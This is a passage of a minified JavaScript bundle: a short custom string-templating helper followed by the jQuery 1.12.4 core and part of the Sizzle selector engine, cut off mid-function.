String.prototype.supplementWith=function(){var data={};return jQuery.each(arguments,(function(index,object){jQuery.extend(data,object)})),this.replace(/\{([\w\.]*)\}/g,(function(match,variable){var keys=variable.split("."),value=data[keys.shift()];return keys.forEach((function(key){value=value[key]})),null!=value?value:""}))},function(global,factory){"object"==typeof module&&"object"==typeof module.exports?module.exports=global.document?factory(global,!0):function(w){if(!w.document)throw new Error("jQuery requires a window with a document");return factory(w)}:factory(global)}("undefined"!=typeof window?window:this,(function(window,noGlobal){var deletedIds=[],document=window.document,slice=deletedIds.slice,concat=deletedIds.concat,push=deletedIds.push,indexOf=deletedIds.indexOf,class2type={},toString=class2type.toString,hasOwn=class2type.hasOwnProperty,support={},jQuery=function(selector,context){return new jQuery.fn.init(selector,context)},rtrim=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,rmsPrefix=/^-ms-/,rdashAlpha=/-([\da-z])/gi,fcamelCase=function(all,letter){return letter.toUpperCase()};function isArrayLike(obj){var length=!!obj&&"length"in obj&&obj.length,type=jQuery.type(obj);return"function"!==type&&!jQuery.isWindow(obj)&&("array"===type||0===length||"number"==typeof length&&length>0&&length-1 in obj)}jQuery.fn=jQuery.prototype={jquery:"1.12.4",constructor:jQuery,selector:"",length:0,toArray:function(){return slice.call(this)},get:function(num){return null!=num?num<0?this[num+this.length]:this[num]:slice.call(this)},pushStack:function(elems){var ret=jQuery.merge(this.constructor(),elems);return ret.prevObject=this,ret.context=this.context,ret},each:function(callback){return jQuery.each(this,callback)},map:function(callback){return this.pushStack(jQuery.map(this,(function(elem,i){return callback.call(elem,i,elem)})))},slice:function(){return this.pushStack(slice.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(i){var len=this.length,j=+i+(i<0?len:0);return this.pushStack(j>=0&&j<len?[this[j]]:[])},end:function(){return this.prevObject||this.constructor()},push:push,sort:deletedIds.sort,splice:deletedIds.splice},jQuery.extend=jQuery.fn.extend=function(){var src,copyIsArray,copy,name,options,clone,target=arguments[0]||{},i=1,length=arguments.length,deep=!1;for("boolean"==typeof target&&(deep=target,target=arguments[i]||{},i++),"object"==typeof target||jQuery.isFunction(target)||(target={}),i===length&&(target=this,i--);i<length;i++)if(null!=(options=arguments[i]))for(name in options)src=target[name],target!==(copy=options[name])&&(deep&&copy&&(jQuery.isPlainObject(copy)||(copyIsArray=jQuery.isArray(copy)))?(copyIsArray?(copyIsArray=!1,clone=src&&jQuery.isArray(src)?src:[]):clone=src&&jQuery.isPlainObject(src)?src:{},target[name]=jQuery.extend(deep,clone,copy)):void 0!==copy&&(target[name]=copy));return target},jQuery.extend({expando:"jQuery"+("1.12.4"+Math.random()).replace(/\D/g,""),isReady:!0,error:function(msg){throw new Error(msg)},noop:function(){},isFunction:function(obj){return"function"===jQuery.type(obj)},isArray:Array.isArray||function(obj){return"array"===jQuery.type(obj)},isWindow:function(obj){return null!=obj&&obj==obj.window},isNumeric:function(obj){var realStringObj=obj&&obj.toString();return!jQuery.isArray(obj)&&realStringObj-parseFloat(realStringObj)+1>=0},isEmptyObject:function(obj){var name;for(name in obj)return!1;return!0},isPlainObject:function(obj){var key;if(!obj||"object"!==jQuery.type(obj)||obj.nodeType||jQuery.isWindow(obj))return!1;try{if(obj.constructor&&!hasOwn.call(obj,"constructor")&&!hasOwn.call(obj.constructor.prototype,"isPrototypeOf"))return!1}catch(e){return!1}if(!support.ownFirst)for(key in obj)return hasOwn.call(obj,key);for(key in obj);return void 0===key||hasOwn.call(obj,key)},type:function(obj){return null==obj?obj+"":"object"==typeof obj||"function"==typeof obj?class2type[toString.call(obj)]||"object":typeof obj},globalEval:function(data){data&&jQuery.trim(data)&&(window.execScript||function(data){window.eval.call(window,data)})(data)},camelCase:function(string){return string.replace(rmsPrefix,"ms-").replace(rdashAlpha,fcamelCase)},nodeName:function(elem,name){return elem.nodeName&&elem.nodeName.toLowerCase()===name.toLowerCase()},each:function(obj,callback){var length,i=0;if(isArrayLike(obj))for(length=obj.length;i<length&&!1!==callback.call(obj[i],i,obj[i]);i++);else for(i in obj)if(!1===callback.call(obj[i],i,obj[i]))break;return obj},trim:function(text){return null==text?"":(text+"").replace(rtrim,"")},makeArray:function(arr,results){var ret=results||[];return null!=arr&&(isArrayLike(Object(arr))?jQuery.merge(ret,"string"==typeof arr?[arr]:arr):push.call(ret,arr)),ret},inArray:function(elem,arr,i){var len;if(arr){if(indexOf)return indexOf.call(arr,elem,i);for(len=arr.length,i=i?i<0?Math.max(0,len+i):i:0;i<len;i++)if(i in arr&&arr[i]===elem)return i}return-1},merge:function(first,second){for(var len=+second.length,j=0,i=first.length;j<len;)first[i++]=second[j++];if(len!=len)for(;void 0!==second[j];)first[i++]=second[j++];return first.length=i,first},grep:function(elems,callback,invert){for(var matches=[],i=0,length=elems.length,callbackExpect=!invert;i<length;i++)!callback(elems[i],i)!==callbackExpect&&matches.push(elems[i]);return matches},map:function(elems,callback,arg){var length,value,i=0,ret=[];if(isArrayLike(elems))for(length=elems.length;i<length;i++)null!=(value=callback(elems[i],i,arg))&&ret.push(value);else for(i in elems)null!=(value=callback(elems[i],i,arg))&&ret.push(value);return concat.apply([],ret)},guid:1,proxy:function(fn,context){var args,proxy,tmp;if("string"==typeof context&&(tmp=fn[context],context=fn,fn=tmp),jQuery.isFunction(fn))return args=slice.call(arguments,2),proxy=function(){return fn.apply(context||this,args.concat(slice.call(arguments)))},proxy.guid=fn.guid=fn.guid||jQuery.guid++,proxy},now:function(){return+new Date},support:support}),"function"==typeof Symbol&&(jQuery.fn[Symbol.iterator]=deletedIds[Symbol.iterator]),jQuery.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "),(function(i,name){class2type["[object "+name+"]"]=name.toLowerCase()}));var Sizzle=function(window){var i,support,Expr,getText,isXML,tokenize,compile,select,outermostContext,sortInput,hasDuplicate,setDocument,document,docElem,documentIsHTML,rbuggyQSA,rbuggyMatches,matches,contains,expando="sizzle"+1*new Date,preferredDoc=window.document,dirruns=0,done=0,classCache=createCache(),tokenCache=createCache(),compilerCache=createCache(),sortOrder=function(a,b){return a===b&&(hasDuplicate=!0),0},hasOwn={}.hasOwnProperty,arr=[],pop=arr.pop,push_native=arr.push,push=arr.push,slice=arr.slice,indexOf=function(list,elem){for(var i=0,len=list.length;i<len;i++)if(list[i]===elem)return i;return-1},booleans="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",whitespace="[\\x20\\t\\r\\n\\f]",identifier="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",attributes="\\[[\\x20\\t\\r\\n\\f]*("+identifier+")(?:"+whitespace+"*([*^$|!~]?=)"+whitespace+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+identifier+"))|)"+whitespace+"*\\]",pseudos=":("+identifier+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+attributes+")*)|.*)\\)|)",rwhitespace=new RegExp(whitespace+"+","g"),rtrim=new RegExp("^[\\x20\\t\\r\\n\\f]+|((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$","g"),rcomma=new RegExp("^[\\x20\\t\\r\\n\\f]*,[\\x20\\t\\r\\n\\f]*"),rcombinators=new RegExp("^[\\x20\\t\\r\\n\\f]*([>+~]|[\\x20\\t\\r\\n\\f])[\\x20\\t\\r\\n\\f]*"),rattributeQuotes=new RegExp("=[\\x20\\t\\r\\n\\f]*([^\\]'\"]*?)[\\x20\\t\\r\\n\\f]*\\]","g"),rpseudo=new RegExp(pseudos),ridentifier=new RegExp("^"+identifier+"$"),matchExpr={ID:new RegExp("^#("+identifier+")"),CLASS:new RegExp("^\\.("+identifier+")"),TAG:new RegExp("^("+identifier+"|[*])"),ATTR:new RegExp("^"+attributes),PSEUDO:new RegExp("^"+pseudos),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\([\\x20\\t\\r\\n\\f]*(even|odd|(([+-]|)(\\d*)n|)[\\x20\\t\\r\\n\\f]*(?:([+-]|)[\\x20\\t\\r\\n\\f]*(\\d+)|))[\\x20\\t\\r\\n\\f]*\\)|)","i"),bool:new RegExp("^(?:"+booleans+")$","i"),needsContext:new RegExp("^[\\x20\\t\\r\\n\\f]*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\([\\x20\\t\\r\\n\\f]*((?:-\\d)?\\d*)[\\x20\\t\\r\\n\\f]*\\)|)(?=[^-]|$)","i")},rinputs=/^(?:input|select|textarea|button)$/i,rheader=/^h\d$/i,rnative=/^[^{]+\{\s*\[native \w/,rquickExpr=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,rsibling=/[+~]/,rescape=/'|\\/g,runescape=new RegExp("\\\\([\\da-f]{1,6}[\\x20\\t\\r\\n\\f]?|([\\x20\\t\\r\\n\\f])|.)","ig"),funescape=function(_,escaped,escapedWhitespace){var high="0x"+escaped-65536;return high!=high||escapedWhitespace?escaped:high<0?String.fromCharCode(high+65536):String.fromCharCode(high>>10|55296,1023&high|56320)},unloadHandler=function(){setDocument()};try{push.apply(arr=slice.call(preferredDoc.childNodes),preferredDoc.childNodes),arr[preferredDoc.childNodes.length].nodeType}catch(e){push={apply:arr.length?function(target,els){push_native.apply(target,slice.call(els))}:function(target,els){for(var j=target.length,i=0;target[j++]=els[i++];);target.length=j-1}}}function Sizzle(selector,context,results,seed){var m,i,elem,nid,nidselect,match,groups,newSelector,newContext=context&&context.ownerDocument,nodeType=context?context.nodeType:9;if(results=results||[],"string"!=typeof selector||!selector||1!==nodeType&&9!==nodeType&&11!==nodeType)return results;if(!seed&&((context?context.ownerDocument||context:preferredDoc)!==document&&setDocument(context),context=context||document,documentIsHTML)){if(11!==nodeType&&(match=rquickExpr.exec(selector)))if(m=match[1]){if(9===nodeType){if(!(elem=context.getElementById(m)))return results;if(elem.id===m)return results.push(elem),results}else if(newContext&&(elem=newContext.getElementById(m))&&contains(context,elem)&&elem.id===m)return results.push(elem),results}else{if(match[2])return push.apply(results,context.getElementsByTagName(selector)),results;if((m=match[3])&&support.getElementsByClassName&&context.getElementsByClassName)return push.apply(results,context.getElementsByClassName(m)),results}if(support.qsa&&!compilerCache[selector+" "]&&(!rbuggyQSA||!rbuggyQSA.test(selector))){if(1!==nodeType)newContext=context,newSelector=selector;else if("object"!==context.nodeName.toLowerCase()){for((nid=context.getAttribute("id"))?nid=nid.replace(rescape,"\\$&"):context.setAttribute("id",nid=expando),i=(groups=tokenize(selector)).length,nidselect=ridentifier.test(nid)?"#"+nid:"[id='"+nid+"']";i--;)groups[i]=nidselect+" "+toSelector(groups[i]);newSelector=groups.join(","),newContext=rsibling.test(selector)&&testContext(context.parentNode)||context}if(newSelector)try{return push.apply(results,newContext.querySelectorAll(newSelector)),results}catch(qsaError){}finally{nid===expando&&context.removeAttribute("id")}}}return select(selector.replace(rtrim,"$1"),context,results,seed)}function createCache(){var keys=[];return function cache(key,value){return keys.push(key+" ")>Expr.cacheLength&&delete cache[keys.shift()],cache[key+" "]=value}}function markFunction(fn){return fn[expando]=!0,fn}function assert(fn){var div=document.createElement("div");try{return!!fn(div)}catch(e){return!1}finally{div.parentNode&&div.parentNode.removeChild(div),div=null}}function addHandle(attrs,handler){for(var arr=attrs.split("|"),i=arr.length;i--;)Expr.attrHandle[arr[i]]=handler}function siblingCheck(a,b){var cur=b&&a,diff=cur&&1===a.nodeType&&1===b.nodeType&&(~b.sourceIndex||-2147483648)-(~a.sourceIndex||-2147483648);if(diff)return diff;if(cur)for(;cur=cur.nextSibling;)if(cur===b)return-1;return a?1:-1}function createInputPseudo(type){return function(elem){return"input"===elem.nodeName.toLowerCase()&&elem.type===type}}function createButtonPseudo(type){return function(elem){var name=elem.nodeName.toLowerCase();return("input"===name||"button"===name)&&elem.type===type}}function createPositionalPseudo(fn){return markFunction((function(argument){return argument=+argument,markFunction((function(seed,matches){for(var j,matchIndexes=fn([],seed.length,argument),i=matchIndexes.length;i--;)seed[j=matchIndexes[i]]&&(seed[j]=!(matches[j]=seed[j]))}))}))}function testContext(context){return context&&void 0!==context.getElementsByTagName&&context}for(i in support=Sizzle.support={},isXML=Sizzle.isXML=function(elem){var documentElement=elem&&(elem.ownerDocument||elem).documentElement;return!!documentElement&&"HTML"!==documentElement.nodeName},setDocument=Sizzle.setDocument=function(node){var hasCompare,parent,doc=node?node.ownerDocument||node:preferredDoc;return doc!==document&&9===doc.nodeType&&doc.documentElement?(docElem=(document=doc).documentElement,documentIsHTML=!isXML(document),(parent=document.defaultView)&&parent.top!==parent&&(parent.addEventListener?parent.addEventListener("unload",unloadHandler,!1):parent.attachEvent&&parent.attachEvent("onunload",unloadHandler)),support.attributes=assert((function(div){return div.className="i",!div.getAttribute("className")})),support.getElementsByTagName=assert((function(div){return div.appendChild(document.createComment("")),!div.getElementsByTagName("*").length})),support.getElementsByClassName=rnative.test(document.getElementsByClassName),support.getById=assert((function(div){return docElem.appendChild(div).id=expando,!document.getElementsByName||!document.getElementsByName(expando).length})),support.getById?(Expr.find.ID=function(id,context){if(void 0!==context.getElementById&&documentIsHTML){var m=context.getElementById(id);return m?[m]:[]}},Expr.filter.ID=function(id){var attrId=id.replace(runescape,funescape);return function(elem){return elem.getAttribute("id")===attrId}}):(delete Expr.find.ID,Expr.filter.ID=function(id){var attrId=id.replace(runescape,funescape);return function(elem){var node=void 0!==elem.getAttributeNode&&elem.getAttributeNode("id");return node&&node.value===attrId}}),Expr.find.TAG=support.getElementsByTagName?function(tag,context){return void 0!==context.getElementsByTagName?context.getElementsByTagName(tag):support.qsa?context.querySelectorAll(tag):void 0}:function(tag,context){var elem,tmp=[],i=0,results=context.getElementsByTagName(tag);if("*"===tag){for(;elem=results[i++];)1===elem.nodeType&&tmp.push(elem);return tmp}return results},Expr.find.CLASS=support.getElementsByClassName&&function(className,context){if(void 0!==context.getElementsByClassName&&documentIsHTML)return context.getElementsByClassName(className)},rbuggyMatches=[],rbuggyQSA=[],(support.qsa=rnative.test(document.querySelectorAll))&&(assert((function(div){docElem.appendChild(div).innerHTML="<a id='"+expando+"'></a><select id='"+expando+"-\r\\' msallowcapture=''><option selected=''></option></select>",div.querySelectorAll("[msallowcapture^='']").length&&rbuggyQSA.push("[*^$]=[\\x20\\t\\r\\n\\f]*(?:''|\"\")"),div.querySelectorAll("[selected]").length||rbuggyQSA.push("\\[[\\x20\\t\\r\\n\\f]*(?:value|"+booleans+")"),div.querySelectorAll("[id~="+expando+"-]").length||rbuggyQSA.push("~="),div.querySelectorAll(":checked").length||rbuggyQSA.push(":checked"),div.querySelectorAll("a#"+expando+"+*").length||rbuggyQSA.push(".#.+[+~]")})),assert((function(div){var input=document.createElement("input");input.setAttribute("type","hidden"),div.appendChild(input).setAttribute("name","D"),div.querySelectorAll("[name=d]").length&&rbuggyQSA.push("name[\\x20\\t\\r\\n\\f]*[*^$|!~]?="),div.querySelectorAll(":enabled").length||rbuggyQSA.push(":enabled",":disabled"),div.querySelectorAll("*,:x"),rbuggyQSA.push(",.*:")}))),(support.matchesSelector=rnative.test(matches=docElem.matches||docElem.webkitMatchesSelector||docElem.mozMatchesSelector||docElem.oMatchesSelector||docElem.msMatchesSelector))&&assert((function(div){support.disconnectedMatch=matches.call(div,"div"),matches.call(div,"[s!='']:x"),rbuggyMatches.push("!=",pseudos)})),rbuggyQSA=rbuggyQSA.length&&new RegExp(rbuggyQSA.join("|")),rbuggyMatches=rbuggyMatches.length&&new RegExp(rbuggyMatches.join("|")),hasCompare=rnative.test(docElem.compareDocumentPosition),contains=hasCompare||rnative.test(docElem.contains)?function(a,b){var adown=9===a.nodeType?a.documentElement:a,bup=b&&b.parentNode;return a===bup||!(!bup||1!==bup.nodeType||!(adown.contains?adown.contains(bup):a.compareDocumentPosition&&16&a.compareDocumentPosition(bup)))}:function(a,b){if(b)for(;b=b.parentNode;)if(b===a)return!0;return!1},sortOrder=hasCompare?function(a,b){if(a===b)return hasDuplicate=!0,0;var compare=!a.compareDocumentPosition-!b.compareDocumentPosition;return compare||(1&(compare=(a.ownerDocument||a)===(b.ownerDocument||b)?a.compareDocumentPosition(b):1)||!support.sortDetached&&b.compareDocumentPosition(a)===compare?a===document||a.ownerDocument===preferredDoc&&contains(preferredDoc,a)?-1:b===document||b.ownerDocument===preferredDoc&&contains(preferredDoc,b)?1:sortInput?indexOf(sortInput,a)-indexOf(sortInput,b):0:4&compare?-1:1)}:function(a,b){if(a===b)return hasDuplicate=!0,0;var cur,i=0,aup=a.parentNode,bup=b.parentNode,ap=[a],bp=[b];if(!aup||!bup)return a===document?-1:b===document?1:aup?-1:bup?1:sortInput?indexOf(sortInput,a)-indexOf(sortInput,b):0;if(aup===bup)return siblingCheck(a,b);for(cur=a;cur=cur.parentNode;)ap.unshift(cur);for(cur=b;cur=cur.parentNode;)bp.unshift(cur);for(;ap[i]===bp[i];)i++;return i?siblingCheck(ap[i],bp[i]):ap[i]===preferredDoc?-1:bp[i]===preferredDoc?1:0},document):document},Sizzle.matches=function(expr,elements){return Sizzle(expr,null,null,elements)},Sizzle.matchesSelector=function(elem,expr){if((elem.ownerDocument||elem)!==document&&setDocument(elem),expr=expr.replace(rattributeQuotes,"='$1']"),support.matchesSelector&&documentIsHTML&&!compilerCache[expr+" "]&&(!rbuggyMatches||!rbuggyMatches.test(expr))&&(!rbuggyQSA||!rbuggyQSA.test(expr)))try{var ret=matches.call(elem,expr);if(ret||support.disconnectedMatch||elem.document&&11!==elem.document.nodeType)return ret}catch(e){}return Sizzle(expr,document,null,[elem]).length>0},Sizzle.contains=function(context,elem){return(context.ownerDocument||context)!==document&&setDocument(context),contains(context,elem)},Sizzle.attr=function(elem,name){(elem.ownerDocument||elem)!==document&&setDocument(elem);var fn=Expr.attrHandle[name.toLowerCase()],val=fn&&hasOwn.call(Expr.attrHandle,name.toLowerCase())?fn(elem,name,!documentIsHTML):void 0;return void 0!==val?val:support.attributes||!documentIsHTML?elem.getAttribute(name):(val=elem.getAttributeNode(name))&&val.specified?val.value:null},Sizzle.error=function(msg){throw new Error("Syntax error, unrecognized expression: "+msg)},Sizzle.uniqueSort=function(results){var elem,duplicates=[],j=0,i=0;if(hasDuplicate=!support.detectDuplicates,sortInput=!support.sortStable&&results.slice(0),results.sort(sortOrder),hasDuplicate){for(;elem=results[i++];)elem===results[i]&&(j=duplicates.push(i));for(;j--;)results.splice(duplicates[j],1)}return sortInput=null,results},getText=Sizzle.getText=function(elem){var node,ret="",i=0,nodeType=elem.nodeType;if(nodeType){if(1===nodeType||9===nodeType||11===nodeType){if("string"==typeof elem.textContent)return elem.textContent;for(elem=elem.firstChild;elem;elem=elem.nextSibling)ret+=getText(elem)}else if(3===nodeType||4===nodeType)return elem.nodeValue}else for(;node=elem[i++];)ret+=getText(node);return ret},Expr=Sizzle.selectors={cacheLength:50,createPseudo:markFunction,match:matchExpr,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(match){return match[1]=match[1].replace(runescape,funescape),match[3]=(match[3]||match[4]||match[5]||"").replace(runescape,funescape),"~="===match[2]&&(match[3]=" "+match[3]+" "),match.slice(0,4)},CHILD:function(match){return match[1]=match[1].toLowerCase(),"nth"===match[1].slice(0,3)?(match[3]||Sizzle.error(match[0]),match[4]=+(match[4]?match[5]+(match[6]||1):2*("even"===match[3]||"odd"===match[3])),match[5]=+(match[7]+match[8]||"odd"===match[3])):match[3]&&Sizzle.error(match[0]),match},PSEUDO:function(match){var excess,unquoted=!match[6]&&match[2];return matchExpr.CHILD.test(match[0])?null:(match[3]?match[2]=match[4]||match[5]||"":unquoted&&rpseudo.test(unquoted)&&(excess=tokenize(unquoted,!0))&&(excess=unquoted.indexOf(")",unquoted.length-excess)-unquoted.length)&&(match[0]=match[0].slice(0,excess),match[2]=unquoted.slice(0,excess)),match.slice(0,3))}},filter:{TAG:function(nodeNameSelector){var nodeName=nodeNameSelector.replace(runescape,funescape).toLowerCase();return"*"===nodeNameSelector?function(){return!0}:function(elem){return elem.nodeName&&elem.nodeName.toLowerCase()===nodeName}},CLASS:function(className){var pattern=classCache[className+" "];return pattern||(pattern=new RegExp("(^|[\\x20\\t\\r\\n\\f])"+className+"("+whitespace+"|$)"))&&classCache(className,(function(elem){return pattern.test("string"==typeof elem.className&&elem.className||void 0!==elem.getAttribute&&elem.getAttribute("class")||"")}))},ATTR:function(name,operator,check){return function(elem){var result=Sizzle.attr(elem,name);return null==result?"!="===operator:!operator||(result+="","="===operator?result===check:"!="===operator?result!==check:"^="===operator?check&&0===result.indexOf(check):"*="===operator?check&&result.indexOf(check)>-1:"$="===operator?check&&result.slice(-check.length)===check:"~="===operator?(" "+result.replace(rwhitespace," ")+" ").indexOf(check)>-1:"|="===operator&&(result===check||result.slice(0,check.length+1)===check+"-"))}},CHILD:function(type,what,argument,first,last){var simple="nth"!==type.slice(0,3),forward="last"!==type.slice(-4),ofType="of-type"===what;return 1===first&&0===last?function(elem){return!!elem.parentNode}:function(elem,context,xml){var cache,uniqueCache,outerCache,node,nodeIndex,start,dir=simple!==forward?"nextSibling":"previousSibling",parent=elem.parentNode,name=ofType&&elem.nodeName.toLowerCase(),useCache=!xml&&!ofType,diff=!1;if(parent){if(simple){for(;dir;){for(node=elem;node=node[dir];)if(ofType?node.nodeName.toLowerCase()===name:1===node.nodeType)return!1;start=dir="only"===type&&!start&&"nextSibling"}return!0}if(start=[forward?parent.firstChild:parent.lastChild],forward&&useCache){for(diff=(nodeIndex=(cache=(uniqueCache=(outerCache=(node=parent)[expando]||(node[expando]={}))[node.uniqueID]||(outerCache[node.uniqueID]={}))[type]||[])[0]===dirruns&&cache[1])&&cache[2],node=nodeIndex&&parent.childNodes[nodeIndex];node=++nodeIndex&&node&&node[dir]||(diff=nodeIndex=0)||start.pop();)if(1===node.nodeType&&++diff&&node===elem){uniqueCache[type]=[dirruns,nodeIndex,diff];break}}else if(useCache&&(diff=nodeIndex=(cache=(uniqueCache=(outerCache=(node=elem)[expando]||(node[expando]={}))[node.uniqueID]||(outerCache[node.uniqueID]={}))[type]||[])[0]===dirruns&&cache[1]),!1===diff)for(;(node=++nodeIndex&&node&&node[dir]||(diff=nodeIndex=0)||start.pop())&&((ofType?node.nodeName.toLowerCase()!==name:1!==node.nodeType)||!++diff||(useCache&&((uniqueCache=(outerCache=node[expando]||(node[expando]={}))[node.uniqueID]||(outerCache[node.uniqueID]={}))[type]=[dirruns,diff]),node!==elem)););return(diff-=last)===first||diff%first==0&&diff/first>=0}}},PSEUDO:function(pseudo,argument){var args,fn=Expr.pseudos[pseudo]||Expr.setFilters[pseudo.toLowerCase()]||Sizzle.error("unsupported pseudo: "+pseudo);return fn[expando]?fn(argument):fn.length>1?(args=[pseudo,pseudo,"",argument],Expr.setFilters.hasOwnProperty(pseudo.toLowerCase())?markFunction((function(seed,matches){for(var idx,matched=fn(seed,argument),i=matched.length;i--;)seed[idx=indexOf(seed,matched[i])]=!(matches[idx]=matched[i])})):function(elem){return fn(elem,0,args)}):fn}},pseudos:{not:markFunction((function(selector){var input=[],results=[],matcher=compile(selector.replace(rtrim,"$1"));return matcher[expando]?markFunction((function(seed,matches,context,xml){for(var elem,unmatched=matcher(seed,null,xml,[]),i=seed.length;i--;)(elem=unmatched[i])&&(seed[i]=!(matches[i]=elem))})):function(elem,context,xml){return input[0]=elem,matcher(input,null,xml,results),input[0]=null,!results.pop()}})),has:markFunction((function(selector){return function(elem){return Sizzle(selector,elem).length>0}})),contains:markFunction((function(text){return text=text.replace(runescape,funescape),function(elem){return(elem.textContent||elem.innerText||getText(elem)).indexOf(text)>-1}})),lang:markFunction((function(lang){return ridentifier.test(lang||"")||Sizzle.error("unsupported lang: "+lang),lang=lang.replace(runescape,funescape).toLowerCase(),function(elem){var elemLang;do{if(elemLang=documentIsHTML?elem.lang:elem.getAttribute("xml:lang")||elem.getAttribute("lang"))return(elemLang=elemLang.toLowerCase())===lang||0===elemLang.indexOf(lang+"-")}while((elem=elem.parentNode)&&1===elem.nodeType);return!1}})),target:function(elem){var hash=window.location&&window.location.hash;return hash&&hash.slice(1)===elem.id},root:function(elem){return elem===docElem},focus:function(elem){return elem===document.activeElement&&(!document.hasFocus||document.hasFocus())&&!!(elem.type||elem.href||~elem.tabIndex)},enabled:function(elem){return!1===elem.disabled},disabled:function(elem){return!0===elem.disabled},checked:function(elem){var nodeName=elem.nodeName.toLowerCase();return"input"===nodeName&&!!elem.checked||"option"===nodeName&&!!elem.selected},selected:function(elem){return elem.parentNode&&elem.parentNode.selectedIndex,!0===elem.selected},empty:function(elem){for(elem=elem.firstChild;elem;elem=elem.nextSibling)if(elem.nodeType<6)return!1;return!0},parent:function(elem){return!Expr.pseudos.empty(elem)},header:function(elem){return rheader.test(elem.nodeName)},input:function(elem){return rinputs.test(elem.nodeName)},button:function(elem){var name=elem.nodeName.toLowerCase();return"input"===name&&"button"===elem.type||"button"===name},text:function(elem){var attr;return"input"===elem.nodeName.toLowerCase()&&"text"===elem.type&&(null==(attr=elem.getAttribute("type"))||"text"===attr.toLowerCase())},first:createPositionalPseudo((function(){return[0]})),last:createPositionalPseudo((function(matchIndexes,length){return[length-1]})),eq:createPositionalPseudo((function(matchIndexes,length,argument){return[argument<0?argument+length:argument]})),even:createPositionalPseudo((function(matchIndexes,length){for(var i=0;i<length;i+=2)matchIndexes.push(i);return matchIndexes})),odd:createPositionalPseudo((function(matchIndexes,length){for(var i=1;i<length;i+=2)matchIndexes.push(i);return matchIndexes})),lt:createPositionalPseudo((function(matchIndexes,length,argument){for(var i=argument<0?argument+length:argument;--i>=0;)matchIndexes.push(i);return matchIndexes})),gt:createPositionalPseudo((function(matchIndexes,length,argument){for(var i=argument<0?argument+length:argument;++i<length;)matchIndexes.push(i);return matchIndexes}))}},Expr.pseudos.nth=Expr.pseudos.eq,{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})Expr.pseudos[i]=createInputPseudo(i);for(i in{submit:!0,reset:!0})Expr.pseudos[i]=createButtonPseudo(i);function setFilters(){}function toSelector(tokens){for(var i=0,len=tokens.length,selector="";i<len;i++)selector+=tokens[i].value;return selector}function addCombinator(matcher,combinator,base){var dir=combinator.dir,checkNonElements=base&&"parentNode"===dir,doneName=done++;return combinator.first?function(elem,context,xml){for(;elem=elem[dir];)if(1===elem.nodeType||checkNonElements)return matcher(elem,context,xml)}:function(elem,context,xml){var oldCache,uniqueCache,outerCache,newCache=[dirruns,doneName];if(xml){for(;elem=elem[dir];)if((1===elem.nodeType||checkNonElements)&&matcher(elem,context,xml))return!0}else for(;elem=elem[dir];)if(1===elem.nodeType||checkNonElements){if((oldCache=(uniqueCache=(outerCache=elem[expando]||(elem[expando]={}))[elem.uniqueID]||(outerCache[elem.uniqueID]={}))[dir])&&oldCache[0]===dirruns&&oldCache[1]===doneName)return newCache[2]=oldCache[2];if(uniqueCache[dir]=newCache,newCache[2]=matcher(elem,context,xml))return!0}}}function elementMatcher(matchers){return matchers.length>1?function(elem,context,xml){for(var i=matchers.length;i--;)if(!matchers[i](elem,context,xml))return!1;return!0}:matchers[0]}function condense(unmatched,map,filter,context,xml){for(var elem,newUnmatched=[],i=0,len=unmatched.length,mapped=null!=map;i<len;i++)(elem=unmatched[i])&&(filter&&!filter(elem,context,xml)||(newUnmatched.push(elem),mapped&&map.push(i)));return newUnmatched}function setMatcher(preFilter,selector,matcher,postFilter,postFinder,postSelector){return postFilter&&!postFilter[expando]&&(postFilter=setMatcher(postFilter)),postFinder&&!postFinder[expando]&&(postFinder=setMatcher(postFinder,postSelector)),markFunction((function(seed,results,context,xml){var temp,i,elem,preMap=[],postMap=[],preexisting=results.length,elems=seed||function multipleContexts(selector,contexts,results){for(var i=0,len=contexts.length;i<len;i++)Sizzle(selector,contexts[i],results);return results}(selector||"*",context.nodeType?[context]:context,[]),matcherIn=!preFilter||!seed&&selector?elems:condense(elems,preMap,preFilter,context,xml),matcherOut=matcher?postFinder||(seed?preFilter:preexisting||postFilter)?[]:results:matcherIn;if(matcher&&matcher(matcherIn,matcherOut,context,xml),postFilter)for(temp=condense(matcherOut,postMap),postFilter(temp,[],context,xml),i=temp.length;i--;)(elem=temp[i])&&(matcherOut[postMap[i]]=!(matcherIn[postMap[i]]=elem));if(seed){if(postFinder||preFilter){if(postFinder){for(temp=[],i=matcherOut.length;i--;)(elem=matcherOut[i])&&temp.push(matcherIn[i]=elem);postFinder(null,matcherOut=[],temp,xml)}for(i=matcherOut.length;i--;)(elem=matcherOut[i])&&(temp=postFinder?indexOf(seed,elem):preMap[i])>-1&&(seed[temp]=!(results[temp]=elem))}}else matcherOut=condense(matcherOut===results?matcherOut.splice(preexisting,matcherOut.length):matcherOut),postFinder?postFinder(null,results,matcherOut,xml):push.apply(results,matcherOut)}))}function matcherFromTokens(tokens){for(var checkContext,matcher,j,len=tokens.length,leadingRelative=Expr.relative[tokens[0].type],implicitRelative=leadingRelative||Expr.relative[" "],i=leadingRelative?1:0,matchContext=addCombinator((function(elem){return elem===checkContext}),implicitRelative,!0),matchAnyContext=addCombinator((function(elem){return indexOf(checkContext,elem)>-1}),implicitRelative,!0),matchers=[function(elem,context,xml){var ret=!leadingRelative&&(xml||context!==outermostContext)||((checkContext=context).nodeType?matchContext(elem,context,xml):matchAnyContext(elem,context,xml));return 